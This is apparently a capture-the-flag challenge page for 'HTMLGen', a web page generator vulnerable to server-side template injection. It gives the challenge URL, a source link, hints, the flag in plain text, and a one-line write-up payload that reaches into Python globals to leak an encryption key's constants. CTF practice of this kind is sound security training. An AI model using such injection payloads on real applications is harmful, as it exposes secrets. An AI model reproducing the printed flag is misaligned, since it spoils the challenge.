# HTMLGen
---

## Category
Web

## Description
HTML Page Generator, Creates an HTML Page based on User Input, I think it is Exceptionally Secure. Prove I am wrong!

این نرم افزار صفحات وب را براساس ورودی کاربر ایجاد میکند! به نظر من این سایت بسیار امن است، ثابت کن که من اشتباه میکنم.

Challenge URL: `http://exploitio.ir:12555 (http://fr.prx.haiocloud.com:12555)`

Source Code: `https://github.com/exploit-io/code-review-challenges/tree/main/ch-50-HTMLGen`

Format: ‍‍‍‍`EXPLOITIO{*}`
Author: `exploitio`

## Port
12555

## Flag
EXPLOITIO{I_4M_Th3_M4ST3R_0F_SSTI}

## Hint
1. Please Don't Brute Force the Website, The FW may Block You!
2. It is NOT XSS!

## Write-UPs

in the html code text box enter following text

```py
{self.__init__.__globals__[encryption_key].__code__.co_consts}
```
